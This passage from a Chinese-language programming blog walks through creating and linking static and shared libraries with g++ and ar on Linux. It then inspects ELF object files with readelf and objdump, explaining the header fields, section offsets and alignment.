class="number">4.0</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/skynet/p/3372855.html">图片来自博客</a></p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/965e66764fab853fdf885313e4535d87.png" /></p>
<p>准备工作完毕,下面开始创建静态库</p>
<p>main.cpp为入口,Point.h是头文件,我们需要将Point.cpp创建为静态库</p>
<p>1.将Point.cpp编译成目标文件.o</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# g++ Point.cpp -c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 20</span><br><span class="line">-rw-r--r-- 1 root root  156 4月   1 09:44 main.cpp</span><br><span class="line">-rw-r--r-- 1 root root  985 4月   1 09:46 Point.cpp</span><br><span class="line">-rw-r--r-- 1 root root  872 4月   1 09:43 Point.h</span><br><span class="line">-rw-r--r-- 1 root root 7704 4月   1 10:01 Point.o</span><br></pre></td></tr></table></figure>
<p>2.使用<code>ar</code>工具将刚才生成的目标文件打包成.a静态库文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# ar -crv libpoint.a Point.o</span><br><span class="line">a - Point.o</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 32</span><br><span class="line">-rw-r--r-- 1 root root 8540 4月   1 10:02 libpoint.a</span><br><span class="line">-rw-r--r-- 1 root root  156 4月   1 09:44 main.cpp</span><br><span class="line">-rw-r--r-- 1 root root  985 4月   1 09:46 Point.cpp</span><br><span class="line">-rw-r--r-- 1 root root  872 4月   1 09:43 Point.h</span><br><span class="line">-rw-r--r-- 1 root root 7704 4月   1 10:01 Point.o</span><br></pre></td></tr></table></figure>
<blockquote>
<p>linux下静态库的命名规范是lib开头</p>
</blockquote>
<p>我们没有指定libpoint.a的目录,因此在当前文件夹下形成</p>
<p>到此,静态库libpoint.a建立完毕</p>
<p>下面我们在编译<code>main.cpp</code>时<strong>使用</strong>静态库</p>
<p><code>-L</code>指定静态库目录</p>
<p><code>-l</code>指定静态库和动态库的名字</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# g++ main.cpp -L ./ -l point -o main</span><br><span class="line">.out</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 52</span><br><span class="line">-rw-r--r-- 1 root root  8540 4月   1 10:02 libpoint.a</span><br><span class="line">-rw-r--r-- 1 root root   156 4月   1 09:44 main.cpp</span><br><span class="line">-rwxr-xr-x 1 root root 19824 4月   1 10:07 main.out</span><br><span class="line">-rw-r--r-- 1 root root   985 4月   1 09:46 Point.cpp</span><br><span class="line">-rw-r--r-- 1 root root   872 4月   1 09:43 Point.h</span><br><span class="line">-rw-r--r-- 1 root root  7704 4月   1 10:01 Point.o</span><br></pre></td></tr></table></figure>
<p>可执行文件main.out就生成了</p>
<blockquote>
<p>-L指定静态库目录,由于我们的静态库就在当前文件夹,于是-L ./</p>
<p>-l指定静态库名字,会自动在名字前面加上lib,在后面加上.a后缀,于是指定-l
point就找到了libpoint.a</p>
</blockquote>
<h5 id="动态库的使用">动态库的使用</h5>
<p>linux上动态库的命令规则libbalabala.so,前缀lib后缀.so</p>
<p>windows上动态库使用比较复杂,不管他了</p>
<p><strong>创建动态库</strong></p>
<p>首先生成目标文件,注意使用-fPIC命令行参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# g++ -fPIC -c Point.cpp</span><br></pre></td></tr></table></figure>
<p><code>-fPIC</code>(<strong>position independent
code</strong>)作用是创建==地址无关==代码</p>
<blockquote>
<p>与地址无关?</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/fead4e692210f2756e3b97a437a26de1.png"
alt="image-20220401115548277" />
<figcaption aria-hidden="true">image-20220401115548277</figcaption>
</figure>
<p>参考博客<a
target="_blank" rel="noopener" href="https://www.cnblogs.com/fengliu-/p/10216878.html">linux编译动态库
fPIC作用 - feng..liu - 博客园 (cnblogs.com)</a></p>
</blockquote>
<p>然后<strong>生成</strong>动态链接库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# g++ -shared -o libpoint.so Point.o</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 60</span><br><span class="line">-rwxr-xr-x 1 root root 18712 4月   1 12:12 libpoint.so</span><br><span class="line">-rw-r--r-- 1 root root   156 4月   1 09:44 main.cpp</span><br><span class="line">-rw-r--r-- 1 root root   985 4月   1 09:46 Point.cpp</span><br><span class="line">-rw-r--r-- 1 root root   872 4月   1 09:43 Point.h</span><br><span class="line">-rw-r--r-- 1 root root  7704 4月   1 12:12 Point.o</span><br><span class="line">-rw-r--r-- 1 root root 16441 4月   1 11:46 Point.s</span><br></pre></td></tr></table></figure>
<p>生成了libpoint.so</p>
<p>到此动态库创建完毕,下面<strong>使用</strong>动态库</p>
<p>尝试用使用静态库的方法使用动态库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# g++ main.cpp -L ./ -l point -o main.out</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 80</span><br><span class="line">-rwxr-xr-x 1 root root 18712 4月   1 12:12 libpoint.so</span><br><span class="line">-rw-r--r-- 1 root root   156 4月   1 09:44 main.cpp</span><br><span class="line">-rwxr-xr-x 1 root root 18064 4月   1 12:17 main.out</span><br><span class="line">-rw-r--r-- 1 root root   985 4月   1 09:46 Point.cpp</span><br><span class="line">-rw-r--r-- 1 root root   872 4月   1 09:43 Point.h</span><br><span class="line">-rw-r--r-- 1 root root  7704 4月   1 12:12 Point.o</span><br><span class="line">-rw-r--r-- 1 root root 16441 4月   1 11:46 Point.s</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# ./main.out</span><br><span class="line">./main.out: error <span class="keyword">while</span> loading shared libraries: libpoint.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>可以通过编译但是out文件执行出错,说是找不到libpoint.so</p>
<p>==那么动态库到底在哪里呢?==</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/6c1ebfe5e82c9f20cb3684876fca8ff8.png"
alt="image-20220401122038391" />
<figcaption aria-hidden="true">image-20220401122038391</figcaption>
</figure>
<p>使用第一种方法,将我们自己编写的动态库放在/usr/lib下面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">cp</span> libpoint.so /usr/lib</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# ./main.out</span><br><span class="line">A(5,4)</span><br></pre></td></tr></table></figure>
<p>发现可以正常运行了</p>
<h3 id="参考文档">参考文档</h3>
<p><a
target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/zos-basic-skills?topic=zos-how-programs-are-prepared-run">How
programs are prepared to run on z/OS</a></p>
<p>参考博客</p>
<p>https://www.cnblogs.com/skynet/p/3372855.html</p>
<p>https://www.runoob.com/w3cnote/cpp-header.html</p>
<h2 id="目标文件">目标文件</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220509190447711.png"
alt="image-20220509190447711" />
<figcaption aria-hidden="true">image-20220509190447711</figcaption>
</figure>
<p>又称为elf文件</p>
<p><code>executable and linkable file</code></p>
<blockquote>
<p>ELF文件有三种:</p>
<p>可重定位目标文件<code>.o</code></p>
<p>共享目标文件<code>.so</code></p>
<p>可执行目标文件<code>.out</code></p>
<p>编译器和汇编器生成可重定位目标文件和共享目标文件(<code>.o</code>),连接器生成可执行目标文件(<code>.out</code>)</p>
</blockquote>
<h2 id="可重定位目标文件.o">可重定位目标文件<code>.o</code></h2>
<p><code>.o</code>文件的结构</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220509195158089.png"
alt="image-20220509195158089" />
<figcaption aria-hidden="true">image-20220509195158089</figcaption>
</figure>
<p>一个<code>.c</code>源文件就是一个模块</p>
<p><code>.c</code>源文件使用编译器和汇编器得到<code>.o</code>可重定位目标文件</p>
<h3 id="readelf命令的使用">readelf命令的使用</h3>
<p>对于<code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> n)</span>;<span class="comment">//在使用其他模块中定义的函数前,要先引用该函数,否则报编译错</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> val=sum(<span class="built_in">array</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>gcc main.c -Og -c -o main.o</code>将其编译成为可重定位目标文件<code>main.o</code></p>
<p>下面对<code>main.o</code>使用<code>readelf</code>的一系列命令进行观察</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220509193405618.png"
alt="image-20220509193405618" />
<figcaption aria-hidden="true">image-20220509193405618</figcaption>
</figure>
<h4 id="h打印elf文件头信息"><code>-h</code>打印elf文件头信息</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              REL (Relocatable file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x0</span></span><br><span class="line"><span class="string">  Start of program headers:          0 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          776 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           0 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         0</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         13</span></span><br><span class="line"><span class="string">  Section header string table index: 12</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>1.<code>Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220509194647169.png"
alt="image-20220509194647169" />
<figcaption aria-hidden="true">image-20220509194647169</figcaption>
</figure>
<p>魔数,表明本文件类型等基本信息</p>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 4%" />
<col style="width: 3%" />
<col style="width: 3%" />
<col style="width: 3%" />
<col style="width: 24%" />
<col style="width: 27%" />
<col style="width: 20%" />
</colgroup>
<thead>
<tr>
<th>16进制</th>
<th>7f</th>
<th>45</th>
<th>4c</th>
<th>46</th>
<th>02</th>
<th>01</th>
<th>01</th>
</tr>
</thead>
<tbody>
<tr>
<td>ascii码或意义</td>
<td>DEL符</td>
<td>'E'</td>
<td>'L'</td>
<td>'F'</td>
<td>01表示32位<br />02表示64位</td>
<td>01表示小端法<br />02表示大端法</td>
<td>ELF版本号<br />通常为1</td>
</tr>
</tbody>
</table>
<p>后面9个字节==ELF标准==中无定义,用0填充,和前面的<code>7f 45 4c 46 02 01 01</code>凑成16个字节</p>
<p>2.<code>Start of program headers:          0 (bytes into file)</code></p>
<p>程序头开始位置,对于.o文件来说,它距离可执行还缺链接这一大步,程序头对他来说没意义</p>
<p>3.<code>Start of section headers:          776 (bytes into file)</code></p>
<p>节头开始时的字节,即本文件的第776字节开始时节头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220510184122775.png"
alt="image-20220510184122775" />
<figcaption aria-hidden="true">image-20220510184122775</figcaption>
</figure>
<p>使用010editor观察,<code>section header table</code>的起始位置是<code>0300h+8=776</code>字节</p>
<p>4.<code>Size of this header:               64 (bytes)</code></p>
<p>本头(elf文件头)的大小为64字节(16进制表示为0x40)即本elf头部分占用本文件的0到63字节,则下一部分即sections部分从0x40开始</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220510184615368.png"
alt="image-20220510184615368" />
<figcaption aria-hidden="true">image-20220510184615368</figcaption>
</figure>
<p>5.<code>Size of section headers:           64 (bytes)</code></p>
<p><code>section header table</code>中,每个<code>section</code>表项的大小</p>
<p>6.<code>Number of section headers:         13</code></p>
<p><code>section header table</code>中的表项数</p>
<p>5和6合计可以计算出<code>section header table</code>的大小为13*64=832字节</p>
<p>又知道<code>section header table</code>
的起始位置为<code>776</code>(10进制)字节处,加上该部分大小832字节可以计算得到本<code>.o</code>文件总大小为<code>1608</code></p>
<p>使用wc命令可以验证刚才计算(<code>wordcount</code>统计文件大小(字节数))</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/Linker# <span class="built_in">wc</span> main.o</span><br><span class="line">   3   13 1608 main.o</span><br></pre></td></tr></table></figure>
<p>7.<code>Section header string table index: 12</code></p>
<h4
id="s打印整个section-header-table表信息"><code>-S</code>打印整个<code>section header table</code>表信息</h4>
<table>
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
<col style="width: 8%" />
<col style="width: 10%" />
<col style="width: 25%" />
<col style="width: 8%" />
<col style="width: 10%" />
<col style="width: 7%" />
<col style="width: 5%" />
<col style="width: 5%" />
<col style="width: 7%" />
</colgroup>
<thead>
<tr>
<th>表头</th>
<th>Name</th>
<th>Type</th>
<th>Address</th>
<th>Offset</th>
<th>Size</th>
<th>EntSize</th>
<th>Flags</th>
<th>Link</th>
<th>Info</th>
<th>Align</th>
</tr>
</thead>
<tbody>
<tr>
<td>含义</td>
<td>节名</td>
<td>节类型</td>
<td></td>
<td>在本文件中的偏移量</td>
<td>节大小</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">There are 13 section headers, starting at offset 0x308:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000	</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       000000000000001e  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 2] .rela.text        RELA             0000000000000000  00000250</span><br><span class="line">       0000000000000030  0000000000000018   I      10     1     8</span><br><span class="line">  [ 3] .data             PROGBITS         0000000000000000  00000060</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 4] .bss              NOBITS           0000000000000000  00000068</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 5] .comment          PROGBITS         0000000000000000  00000068</span><br><span class="line">       000000000000002c  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 6] .note.GNU-stack   PROGBITS         0000000000000000  00000094</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [ 7] .note.gnu.propert NOTE             0000000000000000  00000098</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 8] .eh_frame         PROGBITS         0000000000000000  000000b8</span><br><span class="line">       0000000000000030  0000000000000000   A       0     0     8</span><br><span class="line">  [ 9] .rela.eh_frame    RELA             0000000000000000  00000280</span><br><span class="line">       0000000000000018  0000000000000018   I      10     8     8</span><br><span class="line">  [10] .symtab           SYMTAB           0000000000000000  000000e8</span><br><span class="line">       0000000000000138  0000000000000018          11     9     8</span><br><span class="line">  [11] .strtab           STRTAB           0000000000000000  00000220</span><br><span class="line">       000000000000002d  0000000000000000           0     0     1</span><br><span class="line">  [12] .shstrtab         STRTAB           0000000000000000  00000298</span><br><span class="line">       000000000000006c  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>以<code>.text</code>节为例子</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">     000000000000001e  0000000000000000  AX       0     0     1</span><br></pre></td></tr></table></figure>
<p><code>Offset=0x40</code>即本节在本文件中的<code>0x40</code>位置,又elfheader占用了前64个字节(0~0x3F),因此<code>.text</code>节是紧接着elfheader存放的,大小为<code>0x1e=30</code>字节</p>
<p>那么下一个节的起始位置就应该是<code>0x40+0x1e=0x5e</code></p>
<p>然而下一个节<code>.data</code>的<code>Offset=0x60</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ 3] .data             PROGBITS         0000000000000000  00000060</span><br><span class="line">     0000000000000008  0000000000000000  WA       0     0     8;Align对齐为8</span><br></pre></td></tr></table></figure>
<p>用010editor观察发现0x5e和0x5f全是0,估计是考虑了对齐的原因</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220510201200464.png"
alt="image-20220510201200464" />
<figcaption aria-hidden="true">image-20220510201200464</figcaption>
</figure>
<p>用objdump -s观察</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .text:</span><br><span class="line"> 0000 f30f1efa 4883ec08 be020000 00488d3d  ....H........H.=</span><br><span class="line"> 0010 00000000 e8000000 004883c4 08c3      .........H....  </span><br><span class="line">Contents of section .data:</span><br><span class="line"> 0000 01000000 02000000                    ........     </span><br><span class="line"> 如果0x5e和0x5f是.data的前两个字符,合计应该是10个字节,而readelf统计的data区大小为8字节</span><br></pre></td></tr></table></figure>
<p>可以断定<code>0x5e</code>和<code>0x5f</code>的<code>0</code>是对齐方式导致的</p>
<h4 id="观察某一节">观察某一节</h4>
<p>只需要在参数上指定该节的首字符,比如要观察<code>.rel</code>开头的节</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/Linker# readelf -r main.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rela.text&#x27;</span> at offset 0x2f0 contains 2 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000000016  000700000002 R_X86_64_PC32     0000000000000000 .rodata - 4</span><br><span class="line">000000000020  001100000004 R_X86_64_PLT32    0000000000000000 <span class="built_in">printf</span> - 4</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rela.eh_frame&#x27;</span> at offset 0x320 contains 1 entry:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000000020  000200000002 R_X86_64_PC32     0000000000000000 .text + 0</span><br></pre></td></tr></table></figure>
<p>观察符号表节</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/Linker# readelf -s main.o</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains 18 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS main.c</span><br><span class="line">     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 0000000000000004     4 OBJECT  LOCAL  DEFAULT    3 c</span><br><span class="line">     6: 0000000000000000     4 OBJECT  LOCAL  DEFAULT    4 d</span><br><span class="line">     7: 0000000000000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     8: 0000000000000008     4 OBJECT  LOCAL  DEFAULT    3 f.2320</span><br><span class="line">     9: 0000000000000000     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">    10: 0000000000000000     0 SECTION LOCAL  DEFAULT    8</span><br><span class="line">    11: 0000000000000000     0 SECTION LOCAL  DEFAULT    9</span><br><span class="line">    12: 0000000000000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">    13: 0000000000000000     4 OBJECT  GLOBAL DEFAULT    3 a</span><br><span class="line">    14: 0000000000000004     4 OBJECT  GLOBAL DEFAULT  COM b</span><br><span class="line">    15: 0000000000000000    43 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    16: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    17: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
<h3 id="可重定位目标文件的常用节">可重定位目标文件的常用节</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> c=<span class="number">20</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> d;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> e=<span class="number">30</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> f=<span class="number">40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="text"><code>.text</code></h4>
<p>存放指令</p>
<p>使用<code>objdump -d main.o</code>可以观察<code>.text</code>的反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">main.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	55                   	push   %rbp</span><br><span class="line">   5:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">   8:	48 83 ec 10          	sub    $0x10,%rsp</span><br><span class="line">   c:	c7 45 fc 1e 00 00 00 	movl   $0x1e,-0x4(%rbp)</span><br><span class="line">  13:	48 8d 3d 00 00 00 00 	lea    0x0(%rip),%rdi        # 1a &lt;main+0x1a&gt;</span><br><span class="line">  1a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  1f:	e8 00 00 00 00       	callq  24 &lt;main+0x24&gt;</span><br><span class="line">  24:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  29:	c9                   	leaveq </span><br><span class="line">  2a:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<h4 id="data"><code>.data</code></h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">     000000000000001e  0000000000000000  AX       0     0     1</span><br></pre></td></tr></table></figure>
<p>存放已经初始化(且不为零)的全局变量或者局部变量</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220510203006548.png"
alt="image-20220510203006548" />
